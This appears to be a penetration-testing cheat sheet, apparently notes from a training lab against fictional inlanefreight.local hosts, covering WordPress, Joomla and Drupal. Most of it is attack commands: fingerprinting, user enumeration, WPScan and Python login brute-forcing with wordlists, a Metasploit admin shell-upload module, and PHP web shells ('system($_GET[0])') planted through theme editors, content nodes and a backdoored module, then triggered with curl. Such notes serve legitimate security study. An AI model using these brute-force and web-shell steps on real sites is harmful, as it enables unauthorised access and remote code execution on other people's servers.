## Wordpress Footprinting
/robots.txt

curl -s http://blog.inlanefreight.local | grep WordPress 

curl -s http://blog.inlanefreight.local/ | grep themes

curl -s http://blog.inlanefreight.local/ | grep plugins

curl -s http://blog.inlanefreight.local/?p=1 | grep plugins

## Enumerating Wordpress Users
valid username = the password is incorrect

not valid username = user was not found

## WPScan
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token TOKEN

## WPScan Login Brute-Force
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

## Wordpress Code Execution via PHP Files
http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen

add "system($_GET[0]);" into .php file in theme editor.

curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

or 
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

## Wordpress Code Execution via Leveraging Known Vulnerabilities
Check web for CVEs sooner than the version

## Joomla Footprinting
/robots.txt

curl -s http://dev.inlanefreight.local/ | grep Joomla

curl -s http://dev.inlanefreight.local/README.txt | head -n 5

curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

## Droopescan Joomla
droopescan scan joomla --url http://dev.inlanefreight.local/

## Brute-Force Joomla Login
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

## Joomla Code Execution via PHP Files
system($_GET[0]);

http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA%3D%3D

curl -s http://dev.inlanefreight.local/templates/protostar/error.php?0=id

## Joomla Code Execution via Leveraging Known Vulnerabilities
Check web for CVEs sooner than the version

## Drupal Footprinting
curl -s http://drupal.inlanefreight.local | grep Drupal

curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

curl -s http://drupal.inlanefreight.local/CHANGELOG.txt

## Droopescan Drupal
droopescan scan drupal -u http://drupal.inlanefreight.local

## Drupal Code Execution via PHP Files
http://drupal-qa.inlanefreight.local/#overlay=admin/modules

http://drupal-qa.inlanefreight.local/#overlay=node/add

<?php
system($_GET['0']);
?>

curl -s http://drupal-qa.inlanefreight.local/node/3?0=id

## Drupal Code Execution via Backdoored Module
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz

tar xvf captcha-8.x-1.2.tar.gz

touch > shell.php

touch > .htaccess

mv shell.php .htaccess captcha

tar cvf captcha.tar.gz captcha/

http://drupal.inlanefreight.local/core/authorize.php > click install

curl -s drupal.inlanefreight.local/modules/captcha/shell.php?0=id

## Joomla Code Execution via Leveraging Known Vulnerabilities
Check web for CVEs sooner than the version